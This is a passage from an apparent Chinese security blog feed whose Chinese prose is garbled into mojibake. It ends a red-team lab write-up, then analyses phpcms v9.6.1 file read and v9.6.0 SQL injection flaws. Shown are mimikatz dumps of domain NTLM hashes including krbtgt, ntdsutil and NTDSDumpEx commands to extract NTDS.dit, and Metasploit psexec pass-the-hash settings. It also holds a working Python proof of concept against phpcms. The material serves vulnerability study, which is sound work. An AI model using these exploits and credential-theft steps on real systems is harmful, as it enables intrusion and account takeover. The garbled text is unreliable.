93 72 8a da 03 e8 cc f6 1b e0 be 0f 54 3e 57 65     kerberos :         * Username : owa$     * Domain   : GOD.ORG     * Password : 03 eb 3e 5e bb 37 5d 2d a7 1c c3 e8 c2 10 2f 82 95 04 cf 25 e8 fb c2 be 28 71 04 c9 5a 22 11 36 2c 07 b3 f1 83 45 67 70 b7 2b 2c 89 44 76 e6 b9 5f 50 79 31 d6 8b a4 6e fb 28 2f bf c8 14 ee e6 c0 00 9f 5c f2 28 26 ef 97 99 74 5e 8a c2 10 86 0e ad 05 05 08 7c 8e ec e7 49 e9 eb df a6 80 2a c7 43 1c 27 6c cf 76 ff 89 ec 03 ed b2 c7 79 45 36 97 31 20 db c8 b3 2d 6f cb d5 53 d2 a1 e0 e7 18 86 94 2e c2 a8 8e 46 4c 54 01 dd 30 c5 0d 7e ce de 7e b5 ff a1 6b e5 34 a6 c2 dc 0d 57 0f 99 1b bf e1 49 a2 92 37 19 76 df 97 eb 5f 52 7c 21 ae 93 e3 5e ed 2d 87 17 6c f9 e2 12 9a d9 32 a3 33 a2 3b 8f 6d 38 f7 7b fb b5 bb 3b cb 1a 93 7a 98 e3 b9 60 ed 5d 74 89 1b d0 d0 90 56 54 7f 02 93 72 8a da 03 e8 cc f6 1b e0 be 0f 54 3e 57 65     ssp :        credman :    Authentication Id : 0 ; 47752 (00000000:0000ba88)Session           : UndefinedLogonType from 0User Name         : (null)Domain            : (null)Logon Server      : (null)Logon Time        : 2020/2/16 20:59:18SID               :     msv :         [00000003] Primary     * Username : OWA$     * Domain   : GOD     * NTLM     : f8ddc71a57488df64708651271185969     * SHA1     : 93d8566dd8e60d8a6bf47d86fd8c1d47a82bacdf     * NTLM     : f8ddc71a57488df64708651271185969:93d8566dd8e60d8a6bf47d86fd8c1d47a82bacdf    tspkg :        wdigest :        kerberos :        ssp :        credman :    Authentication Id : 0 ; 995 (00000000:000003e3)Session           : Service from 0User Name         : IUSRDomain            : NT AUTHORITYLogon Server      : (null)Logon Time        : 2020/2/16 21:00:06SID               : S-1-5-17    msv :        tspkg :        wdigest :         * Username : (null)     * Domain   : (null)     * Password : (null)    kerberos :        ssp :        credman :    Authentication Id : 0 ; 997 (00000000:000003e5)Session           : Service from 0User Name         : LOCAL SERVICEDomain            : NT AUTHORITYLogon Server      : (null)Logon Time        : 2020/2/16 20:59:23SID               : S-1-5-19    msv :        tspkg :        wdigest :         * Username : (null)     * Domain   : (null)     * Password : (null)    kerberos :         * Username : (null)     * Domain   : (null)     * Password : (null)    ssp :        credman :    Authentication Id : 0 ; 999 (00000000:000003e7)Session           : UndefinedLogonType from 0User Name         : OWA$Domain            : GODLogon Server      : (null)Logon Time        : 2020/2/16 20:59:17SID               : S-1-5-18    msv :        tspkg :        wdigest :         * Username : OWA$     * Domain   : GOD     * Password : 03 eb 3e 5e bb 37 5d 2d a7 1c c3 e8 c2 10 2f 82 95 04 cf 25 e8 fb c2 be 28 71 04 c9 5a 22 11 36 2c 07 b3 f1 83 45 67 70 b7 2b 2c 89 44 76 e6 b9 5f 50 79 31 d6 8b a4 6e fb 28 2f bf c8 14 ee e6 c0 00 9f 5c f2 28 26 ef 97 99 74 5e 8a c2 10 86 0e ad 05 05 08 7c 8e ec e7 49 e9 eb df a6 80 2a c7 43 1c 27 6c cf 76 ff 89 ec 03 ed b2 c7 79 45 36 97 31 20 db c8 b3 2d 6f cb d5 53 d2 a1 e0 e7 18 86 94 2e c2 a8 8e 46 4c 54 01 dd 30 c5 0d 7e ce de 7e b5 ff a1 6b e5 34 a6 c2 dc 0d 57 0f 99 1b bf e1 49 a2 92 37 19 76 df 97 eb 5f 52 7c 21 ae 93 e3 5e ed 2d 87 17 6c f9 e2 12 9a d9 32 a3 33 a2 3b 8f 6d 38 f7 7b fb b5 bb 3b cb 1a 93 7a 98 e3 b9 60 ed 5d 74 89 1b d0 d0 90 56 54 7f 02 93 72 8a da 03 e8 cc f6 1b e0 be 0f 54 3e 57 65     kerberos :         * Username : owa$     * Domain   : GOD.ORG     * Password : 03 eb 3e 5e bb 37 5d 2d a7 1c c3 e8 c2 10 2f 82 95 04 cf 25 e8 fb c2 be 28 71 04 c9 5a 22 11 36 2c 07 b3 f1 83 45 67 70 b7 2b 2c 89 44 76 e6 b9 5f 50 79 31 d6 8b a4 6e fb 28 2f bf c8 14 ee e6 c0 00 9f 5c f2 28 26 ef 97 99 74 5e 8a c2 10 86 0e ad 05 05 08 7c 8e ec e7 49 e9 eb df a6 80 2a c7 43 1c 27 6c cf 76 ff 89 ec 03 ed b2 c7 79 45 36 97 31 20 db c8 b3 2d 6f cb d5 53 d2 a1 e0 e7 18 86 94 2e c2 a8 8e 46 4c 54 01 dd 30 c5 0d 7e ce de 7e b5 ff a1 6b e5 34 a6 c2 dc 0d 57 0f 99 1b bf e1 49 a2 92 37 19 76 df 97 eb 5f 52 7c 21 ae 93 e3 5e ed 2d 87 17 6c f9 e2 12 9a d9 32 a3 33 a2 3b 8f 6d 38 f7 7b fb b5 bb 3b cb 1a 93 7a 98 e3 b9 60 ed 5d 74 89 1b d0 d0 90 56 54 7f 02 93 72 8a da 03 e8 cc f6 1b e0 be 0f 54 3e 57 65     ssp :        credman :    ** SAM ACCOUNT **SAM Username         : krbtgtObject Security ID   : S-1-5-21-2952760202-1353902439-2381784089-502Object Relative ID   : 502Credentials:  Hash NTLM: 58e91a5ac358d86513ab224312314061Object RDN           : Read-only Domain Controllers** SAM ACCOUNT **SAM Username         : AdministratorObject Security ID   : S-1-5-21-2952760202-1353902439-2381784089-500Object Relative ID   : 500Credentials:  Hash NTLM: a45a7246dd74b64a67f22fd7020f1bd8Object RDN           : Administrators502    krbtgt    58e91a5ac358d86513ab2243123140611106    ligang    1e3d22f88dfd250c9312d21686c60f411107    DEV1$    bed18e5b9d13bb384a3041a10d43c01b1104    ROOT-TVI862UBEH$    5604267003351107febdc6ed4e2dfdce1105    STU1$    cb45e05d22e8106184056e55ac541149500    Administrator    a45a7246dd74b64a67f22fd7020f1bd81001    OWA$    f8ddc71a57488df647086512711859691108    gqy    aa3afe73b6e0c2d87b3a428bf696ae711000    liukaifeng01    a45a7246dd74b64a67f22fd7020f1bd8</code></pre><p>å¯æƒœæ²¡æœ‰æ˜æ–‡å¯†ç </p><p>åˆ©ç”¨pthç™»é™†Administrator</p><p>å…ˆå¯¼å‡ºsystem å’Œ NTDS.dit</p><pre><code>ntdsutil &quot;ac i ntds&quot; ifm &quot;create full c:\users\tmp&quot; q qNTDSDumpEx -d ntds.dit -s system -o domain.txtå¾—åˆ°hashAdministrator:500:aad3b435b51404eeaad3b435b51404ee:a45a7246dd74b64a67f22fd7020f1bd8:::</code></pre><p>ç”¨msfä¸Šçš„<code>exploit/windows/smb/psexec</code>æ¥è¿›è¡Œpthæ”»å‡»</p><pre><code>use exploit/windows/smb/psexecset payload windows/meterpreter/bind_tcpset rhost xxxset lport xxxset rhosts 192.168.52.138set smbuser Administratorset smbpass aad3b435b51404eeaad3b435b51404ee:a45a7246dd74b64a67f22fd7020f1bd8</code></pre><p><img src="https://i.loli.net/2020/02/17/9oLDYlWv5GBwOUN.png" alt="image12506"></p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="https://explorersss.github.io/2020/02/17/vulnstackATT&CKçº¢é˜Ÿè¯„ä¼°é¶åœº1æ¸—é€è®°å½•/">https://explorersss.github.io/2020/02/17/vulnstackATT&amp;CKçº¢é˜Ÿè¯„ä¼°é¶åœº1æ¸—é€è®°å½•/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
            <tag> é¶åœº </tag>
            
            <tag> åŸŸæ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpcmsv9.6.1ä»»æ„æ–‡ä»¶è¯»å–</title>
      <link href="/2020/02/13/phpcmsv9.6.1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
      <url>/2020/02/13/phpcmsv9.6.1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</url>
      
        <content type="html"><![CDATA[<h1 id="phpcmsv9-6-1ä»»æ„æ–‡ä»¶è¯»å–"><a href="#phpcmsv9-6-1ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="phpcmsv9.6.1ä»»æ„æ–‡ä»¶è¯»å–"></a>phpcmsv9.6.1ä»»æ„æ–‡ä»¶è¯»å–</h1><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>æ¼æ´ä½ç½®: <code>phpcms/modules/content/down.php</code> ã€‚åœ¨è¯¥æ–‡ä»¶çš„ <code>download</code> æ–¹æ³•ä¸­æœ€åä¸€è¡Œè°ƒç”¨äº† <code>file_down</code> æ–‡ä»¶ä¸‹è½½å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¦è¯»å–çš„æ–‡ä»¶è·¯å¾„ã€‚ </p><pre><code class="php">    public function download() {        $a_k = trim($_GET[&#39;a_k&#39;]);        $pc_auth_key = md5(pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;).$_SERVER[&#39;HTTP_USER_AGENT&#39;].&#39;down&#39;);        $a_k = sys_auth($a_k, &#39;DECODE&#39;, $pc_auth_key);        if(empty($a_k)) showmessage(L(&#39;illegal_parameters&#39;));        unset($i,$m,$f,$t,$ip);        parse_str($a_k);                ...        $starttime = intval($t);        if(preg_match(&#39;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&#39;,$f) || strpos($f, &quot;:\\&quot;)!==FALSE || strpos($f,&#39;..&#39;)!==FALSE) showmessage(L(&#39;url_error&#39;));        $fileurl = trim($f);        if(!$downid || empty($fileurl) || !preg_match(&quot;/[0-9]{10}/&quot;, $starttime) || !preg_match(&quot;/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/&quot;, $ip) || $ip != ip()) showmessage(L(&#39;illegal_parameters&#39;));            $endtime = SYS_TIME - $starttime;        if($endtime &gt; 3600) showmessage(L(&#39;url_invalid&#39;));        if($m) $fileurl = trim($s).trim($fileurl);        if(preg_match(&#39;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&#39;,$fileurl) ) showmessage(L(&#39;url_error&#39;));        //è¿œç¨‹æ–‡ä»¶        if(strpos($fileurl, &#39;:/&#39;) &amp;&amp; (strpos($fileurl, pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;)) === false)) {             header(&quot;Location: $fileurl&quot;);        } else {            if($d == 0) {                header(&quot;Location: &quot;.$fileurl);            } else {                $fileurl = str_replace(array(pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;),&#39;/&#39;), array(pc_base::load_config(&#39;system&#39;,&#39;upload_path&#39;),DIRECTORY_SEPARATOR), $fileurl);                $filename = basename($fileurl);                //å¤„ç†ä¸­æ–‡æ–‡ä»¶                if(preg_match(&quot;/^([\s\S]*?)([\x81-\xfe][\x40-\xfe])([\s\S]*?)/&quot;, $fileurl)) {                    $filename = str_replace(array(&quot;%5C&quot;, &quot;%2F&quot;, &quot;%3A&quot;), array(&quot;\\&quot;, &quot;/&quot;, &quot;:&quot;), urlencode($fileurl));                    $filename = urldecode(basename($filename));                }                $ext = fileext($filename);                $filename = date(&#39;Ymd_his&#39;).random(3).&#39;.&#39;.$ext;                $fileurl=str_replace(array(&quot;&lt;&quot;,&quot;&gt;&quot;),&quot;&quot;,$fileurl);                file_down($fileurl, $filename);            }        }    }</code></pre><p>æˆ‘ä»¬è·Ÿè¿›<code>file_down</code>:</p><pre><code class="php">function file_down($filepath, $filename = &#39;&#39;) {    if(!$filename) $filename = basename($filepath);    if(is_ie()) $filename = rawurlencode($filename);    $filetype = fileext($filename);    $filesize = sprintf(&quot;%u&quot;, filesize($filepath));    if(ob_get_length() !== false) @ob_end_clean();    header(&#39;Pragma: public&#39;);    header(&#39;Last-Modified: &#39;.gmdate(&#39;D, d M Y H:i:s&#39;) . &#39; GMT&#39;);    header(&#39;Cache-Control: no-store, no-cache, must-revalidate&#39;);    header(&#39;Cache-Control: pre-check=0, post-check=0, max-age=0&#39;);    header(&#39;Content-Transfer-Encoding: binary&#39;);    header(&#39;Content-Encoding: none&#39;);    header(&#39;Content-type: &#39;.$filetype);    header(&#39;Content-Disposition: attachment; filename=&quot;&#39;.$filename.&#39;&quot;&#39;);    header(&#39;Content-length: &#39;.$filesize);    readfile($filepath);    exit;}</code></pre><p>å¯ä»¥çœ‹åˆ°ä»–ä¼šç›´æ¥è¯»å–æ–‡ä»¶ç„¶å,exit</p><p>æˆ‘ä»¬å†çœ‹ä¸‹<code>download</code>ä¸­çš„<code>$fileurl</code>çš„ç”Ÿæˆè¿‡ç¨‹:</p><pre><code class="php">if(preg_match(&#39;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&#39;,$f) || strpos($f, &quot;:\\&quot;)!==FALSE || strpos($f,&#39;..&#39;)!==FALSE) showmessage(L(&#39;url_error&#39;));if($m) $fileurl = trim($s).trim($fileurl);if(preg_match(&#39;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&#39;,$fileurl) ) showmessage(L(&#39;url_error&#39;));$fileurl = str_replace(array(pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;),&#39;/&#39;), array(pc_base::load_config(&#39;system&#39;,&#39;upload_path&#39;),DIRECTORY_SEPARATOR), $fileurl);$fileurl=str_replace(array(&quot;&lt;&quot;,&quot;&gt;&quot;),&quot;&quot;,$fileurl);</code></pre><p><code>$fileurl</code>ç”±<code>$f</code>äº§ç”Ÿçš„,å…¶ä¸­ä¸èƒ½å¸¦æœ‰phpç­‰å…³é”®å­—,ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æœ€åä¸€è¡Œçš„str_replaceæ¥ç»•è¿‡,è€Œ<code>$f</code>ç”±<code>parse_str($a_k)</code>å¾—æ¥çš„</p><p>é‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬è¦æ‰¾ä¸€å¤„</p><pre><code class="php">$pc_auth_key = md5(pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;).$_SERVER[&#39;HTTP_USER_AGENT&#39;].&#39;down&#39;);$a_k = sys_auth($a_k, &#39;DECODE&#39;, $pc_auth_key);</code></pre><p>ä»¥<code>$pc_auth_key</code>ä½œä¸ºå¯†é’¥çš„åŠ å¯†ç‚¹</p><p><img src="https://i.loli.net/2020/02/13/csXBxCmkdWqj3or.png" alt="image3860"></p><p>æ˜¾ç„¶åªæœ‰ä¸­é—´çš„é‚£ä¸ªå¯ä»¥</p><pre><code class="php">$pc_auth_key = md5(pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;).$_SERVER[&#39;HTTP_USER_AGENT&#39;].&#39;down&#39;);$a_k = urlencode(sys_auth(&quot;i=$i&amp;d=$d&amp;s=$s&amp;t=&quot;.SYS_TIME.&quot;&amp;ip=&quot;.ip().&quot;&amp;m=&quot;.$m.&quot;&amp;f=$f&amp;modelid=&quot;.$modelid, &#39;ENCODE&#39;, $pc_auth_key));$downurl = &#39;?m=content&amp;c=down&amp;a=download&amp;a_k=&#39;.$a_k;</code></pre><p>è€Œ<code>$i,$m,$f</code>ç­‰éƒ½æ˜¯ä»<code>parse_str($a_k);</code>è·å¾—</p><pre><code class="php">        parse_str($a_k);        if(isset($i)) $i = $id = intval($i);        if(!isset($m)) showmessage(L(&#39;illegal_parameters&#39;));        if(!isset($modelid)||!isset($catid)) showmessage(L(&#39;illegal_parameters&#39;));        if(empty($f)) showmessage(L(&#39;url_invalid&#39;));</code></pre><p>æ¥ä¸‹æ¥å°±è·Ÿ9.6.0ç‰ˆæœ¬çš„sqlæ³¨å…¥ç›¸åŒäº†</p><h2 id="æ£€æµ‹è„šæœ¬"><a href="#æ£€æµ‹è„šæœ¬" class="headerlink" title="æ£€æµ‹è„šæœ¬"></a>æ£€æµ‹è„šæœ¬</h2><pre><code class="python">import reimport requestsimport randomfrom urllib.parse import quotedef poc(url,proxies={}):    sess=requests.session()    sess.get(&quot;%s/index.php?m=wap&amp;siteid=1&quot;%url)    sess.proxies=proxies    pre=list(sess.cookies.get_dict())[0][:5]+&quot;_&quot;    userid=sess.cookies.get_dict()[pre+&quot;siteid&quot;]    param={        &quot;m&quot;:&quot;attachment&quot;,        &quot;c&quot;:&quot;attachments&quot;,        &quot;a&quot;:&quot;swfupload_json&quot;,        &quot;src&quot;:&quot;=1&amp;m=aa&amp;i=1&amp;modelid=1&amp;catid=1&amp;f=%s&amp;ss=&quot; % quote(&quot;index.p&lt;h&lt;p&amp;d=1&quot;)    }    sess.post(&quot;%s/index.php&quot;%url,params=param,data={&quot;userid_flash&quot;:userid})    #print(sess.cookies.get_dict())    a_k=sess.cookies.get_dict()[pre+&quot;att_json&quot;]    result=sess.get(&quot;%s/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=%s&quot;%(url,a_k)).text    #print(userid,a_k)    a_k=re.search(&#39;&#39;&#39;a_k=([^&quot;]*)&#39;&#39;&#39;,result).groups()[0]    #print(result)    #print(a_k)    res=sess.get(&quot;%s/index.php?m=content&amp;c=down&amp;a=download&amp;a_k=%s&quot;%(url,a_k))    if res.status_code==200 and &quot;pc_base::creat_app();&quot; in res.text:        return True    else :        return False#,{&quot;http&quot;:&quot;socks5://127.0.0.1:1080&quot;}print(poc(&quot;http://127.0.0.1/cms/phpcms/9.6.1/&quot;))</code></pre><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p> <a href="https://mochazz.github.io/2019/07/18/phpcmsæ¼æ´åˆ†æåˆé›†/" target="_blank" rel="noopener">https://mochazz.github.io/2019/07/18/phpcmsæ¼æ´åˆ†æåˆé›†/</a> </p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="https://explorersss.github.io/2020/02/13/phpcmsv9.6.1ä»»æ„æ–‡ä»¶è¯»å–/">https://explorersss.github.io/2020/02/13/phpcmsv9.6.1ä»»æ„æ–‡ä»¶è¯»å–/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> cveå¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cveå¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpcmsv9.6.0SQLæ³¨å…¥</title>
      <link href="/2020/02/13/phpcmsv9.6.0SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/02/13/phpcmsv9.6.0SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="phpcmsv9-6-0SQLæ³¨å…¥"><a href="#phpcmsv9-6-0SQLæ³¨å…¥" class="headerlink" title="phpcmsv9.6.0SQLæ³¨å…¥"></a>phpcmsv9.6.0SQLæ³¨å…¥</h1><h2 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h2><ol><li>å¼€å¯wap</li><li>phpcms ç‰ˆæœ¬å°äºç­‰äº9.6.0</li></ol><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>æ¼æ´ä¿¡æ¯:</p><blockquote><p>è¿™ä¸ªç‰ˆæœ¬çš„ <strong>SQLæ³¨å…¥</strong> ä¸»è¦åœ¨äºç¨‹åºå¯¹è§£å¯†åçš„æ•°æ®æ²¡æœ‰è¿›è¡Œè¿‡æ»¤. æ¼æ´æ–‡ä»¶: <strong>phpcms/modules/content/down.php</strong> ã€‚åœ¨å…¶ <strong>init</strong> æ–¹æ³•ä¸­ï¼Œä» <strong>GET</strong> æ•°æ®ä¸­è·å–äº† <strong>a_k</strong> çš„å€¼ ,è§£å¯†åç›´æ¥å˜é‡è¦†ç›–,å¯¼è‡´å‘½ä»¤æ‰§è¡Œ</p></blockquote><pre><code class="php">public function init() {        $a_k = trim($_GET[&#39;a_k&#39;]);        $a_k = sys_auth($a_k, &#39;DECODE&#39;, pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;));        if(empty($a_k)) showmessage(L(&#39;illegal_parameters&#39;));        parse_str($a_k);        if(isset($i)) $i = $id = intval($i);        if(!isset($m)) showmessage(L(&#39;illegal_parameters&#39;));        if(!isset($modelid)||!isset($catid)) showmessage(L(&#39;illegal_parameters&#39;));        if(empty($f)) showmessage(L(&#39;url_invalid&#39;));        $allow_visitor = 1;        $MODEL = getcache(&#39;model&#39;,&#39;commons&#39;);        $tablename = $this-&gt;db-&gt;table_name = $this-&gt;db-&gt;db_tablepre.$MODEL[$modelid][&#39;tablename&#39;];        $this-&gt;db-&gt;table_name = $tablename.&#39;_data&#39;;        $rs = $this-&gt;db-&gt;get_one(array(&#39;id&#39;=&gt;$id));            ...    }</code></pre><p><code>$this-&gt;db-&gt;get_one(array(&#39;id&#39;=&gt;$id));</code>è·Ÿè¿›å»</p><pre><code class="php">final public function get_one($where = &#39;&#39;, $data = &#39;*&#39;, $order = &#39;&#39;, $group = &#39;&#39;) {        if (is_array($where)) $where = $this-&gt;sqls($where);        return $this-&gt;db-&gt;get_one($data, $this-&gt;table_name, $where, $order, $group);    }</code></pre><pre><code class="php">final public function sqls($where, $font = &#39; AND &#39;) {        if (is_array($where)) {            $sql = &#39;&#39;;            foreach ($where as $key=&gt;$val) {                $sql .= $sql ? &quot; $font `$key` = &#39;$val&#39; &quot; : &quot; `$key` = &#39;$val&#39;&quot;;            }            return $sql;        } else {            return $where;        }    }</code></pre><pre><code class="php">public function get_one($data, $table, $where = &#39;&#39;, $order = &#39;&#39;, $group = &#39;&#39;) {        $where = $where == &#39;&#39; ? &#39;&#39; : &#39; WHERE &#39;.$where;        $order = $order == &#39;&#39; ? &#39;&#39; : &#39; ORDER BY &#39;.$order;        $group = $group == &#39;&#39; ? &#39;&#39; : &#39; GROUP BY &#39;.$group;        $limit = &#39; LIMIT 1&#39;;        $field = explode( &#39;,&#39;, $data);        array_walk($field, array($this, &#39;add_special_char&#39;));        $data = implode(&#39;,&#39;, $field);        $sql = &#39;SELECT &#39;.$data.&#39; FROM `&#39;.$this-&gt;config[&#39;database&#39;].&#39;`.`&#39;.$table.&#39;`&#39;.$where.$group.$order.$limit;        $this-&gt;execute($sql);        $res = $this-&gt;fetch_next();        $this-&gt;free_result();        return $res;    }</code></pre><p>æ²¡æœ‰å¯¹è§£å¯†åçš„idè¿›è¡Œä»»ä½•è¿‡æ»¤</p><p>æ¥ç€è¦æ‰¾ä¸€ä¸ªèƒ½ç”¨ç›¸åŒå¯†é’¥åŠ å¯†çš„åœ°æ–¹,è¿™æ ·ä¾¿æ— éœ€æš´éœ²auth_keyå°±èƒ½æ‰§è¡Œæ¶æ„sqlè¯­å¥</p><p>æˆ‘ä»¬åˆ©ç”¨<code>set_cookie</code>æ¥ç”ŸæˆåŠ å¯†æ•°æ®</p><p><code>setcookie($var, sys_auth($value, &#39;ENCODE&#39;), $time, pc_base::load_config(&#39;system&#39;,&#39;cookie_path&#39;), pc_base::load_config(&#39;system&#39;,&#39;cookie_domain&#39;), $s);</code></p><p>æŸ¥æ‰¾è°ƒç”¨<code>set_cookie</code>ä¸”å€¼<code>$value</code>å¯æ§çš„ä½ç½®</p><p><code>phpcms/modules/attachment/attachments.php</code> æ–‡ä»¶çš„ <code>swfupload_json</code> æ–¹æ³•æœ‰æ»¡è¶³æˆ‘ä»¬éœ€è¦çš„ä»£ç ã€‚(èœé¸¡ç›´æ¥çœ‹åˆ«äººæ‰¾åˆ°çš„)</p><pre><code class="php">public function swfupload_json() {        $arr[&#39;aid&#39;] = intval($_GET[&#39;aid&#39;]);        $arr[&#39;src&#39;] = safe_replace(trim($_GET[&#39;src&#39;]));        $arr[&#39;filename&#39;] = urlencode(safe_replace($_GET[&#39;filename&#39;]));        $json_str = json_encode($arr);        $att_arr_exist = param::get_cookie(&#39;att_json&#39;);        $att_arr_exist_tmp = explode(&#39;||&#39;, $att_arr_exist);        if(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) {            return true;        } else {            $json_str = $att_arr_exist ? $att_arr_exist.&#39;||&#39;.$json_str : $json_str;            param::set_cookie(&#39;att_json&#39;,$json_str);            return true;                    }    }</code></pre><p><code>$arr[&#39;src&#39;] = safe_replace(trim($_GET[&#39;src&#39;]));</code>,è·Ÿè¿›<code>safe_replace</code></p><pre><code class="php">function safe_replace($string) {    $string = str_replace(&#39;%20&#39;,&#39;&#39;,$string);    $string = str_replace(&#39;%27&#39;,&#39;&#39;,$string);    $string = str_replace(&#39;%2527&#39;,&#39;&#39;,$string);    $string = str_replace(&#39;*&#39;,&#39;&#39;,$string);    $string = str_replace(&#39;&quot;&#39;,&#39;&amp;quot;&#39;,$string);    $string = str_replace(&quot;&#39;&quot;,&#39;&#39;,$string);    $string = str_replace(&#39;&quot;&#39;,&#39;&#39;,$string);    $string = str_replace(&#39;;&#39;,&#39;&#39;,$string);    $string = str_replace(&#39;&lt;&#39;,&#39;&amp;lt;&#39;,$string);    $string = str_replace(&#39;&gt;&#39;,&#39;&amp;gt;&#39;,$string);    $string = str_replace(&quot;{&quot;,&#39;&#39;,$string);    $string = str_replace(&#39;}&#39;,&#39;&#39;,$string);    $string = str_replace(&#39;\\&#39;,&#39;&#39;,$string);    return $string;}</code></pre><p>è™½ç„¶è¿™é‡Œå•å¼•å·è¢«è¿‡æ»¤äº†,ä½†æ˜¯å‰é¢æ˜¯ç”¨<code>parse_str($a_k);</code>æ¥æ¢å¤å˜é‡çš„,æˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>safe_replace</code>èƒ½å°†æŸäº›å­—ç¬¦æ›¿æ¢ä¸ºç©ºæ ¼ç”¨urlç¼–ç æ¥ç»•è¿‡é»‘åå•</p><p>ä½†æ˜¯åœ¨è°ƒç”¨<code>swfupload_json</code> å‰,å®ƒè¿˜ä¼šè°ƒç”¨<code>__construct</code>æ–¹æ³•</p><pre><code class="php">function __construct() {        pc_base::load_app_func(&#39;global&#39;);        $this-&gt;upload_url = pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;);        $this-&gt;upload_path = pc_base::load_config(&#39;system&#39;,&#39;upload_path&#39;);                $this-&gt;imgext = array(&#39;jpg&#39;,&#39;gif&#39;,&#39;png&#39;,&#39;bmp&#39;,&#39;jpeg&#39;);        $this-&gt;userid = $_SESSION[&#39;userid&#39;] ? $_SESSION[&#39;userid&#39;] : (param::get_cookie(&#39;_userid&#39;) ? param::get_cookie(&#39;_userid&#39;) : sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;));        $this-&gt;isadmin = $this-&gt;admin_username = $_SESSION[&#39;roleid&#39;] ? 1 : 0;        $this-&gt;groupid = param::get_cookie(&#39;_groupid&#39;) ? param::get_cookie(&#39;_groupid&#39;) : 8;        //åˆ¤æ–­æ˜¯å¦ç™»å½•        if(empty($this-&gt;userid)){            showmessage(L(&#39;please_login&#39;,&#39;&#39;,&#39;member&#39;));        }    }</code></pre><p>æˆ‘ä»¬éœ€è¦ç”¨<code>sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;)</code>æ¥ç”Ÿæˆ<code>$this-&gt;userid</code>,æ¥ç»•è¿‡æ­»äº¡exit</p><p>è¿™æ¬¡æˆ‘ä»¬è¿˜éœ€è¦æ‰¾ä¸€ä¸ªåœ°æ–¹æ¥ç”Ÿæˆ<code>userid</code>,ä½†æ˜¯é™åˆ¶æ›´å°‘äº†,åªè¦<code>$this-&gt;userid</code>ä¸ä¸ºç©ºå³å¯</p><p> æˆ‘ä»¬å¯ä»¥æœåˆ° <code>phpcms/modules/wap/index.php</code> æ–‡ä»¶ï¼Œåœ¨è¯¥æ–‡ä»¶ä¸­ <code>$_GET[&#39;siteid&#39;]</code> å¯æ§ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ <strong>cookie</strong> è·å¾—åŠ å¯†åçš„æ•°æ®,è™½ç„¶æœ‰intvalæ¥è¿‡æ»¤</p><pre><code class="php">function __construct() {                $this-&gt;db = pc_base::load_model(&#39;content_model&#39;);        $this-&gt;siteid = isset($_GET[&#39;siteid&#39;]) &amp;&amp; (intval($_GET[&#39;siteid&#39;]) &gt; 0) ? 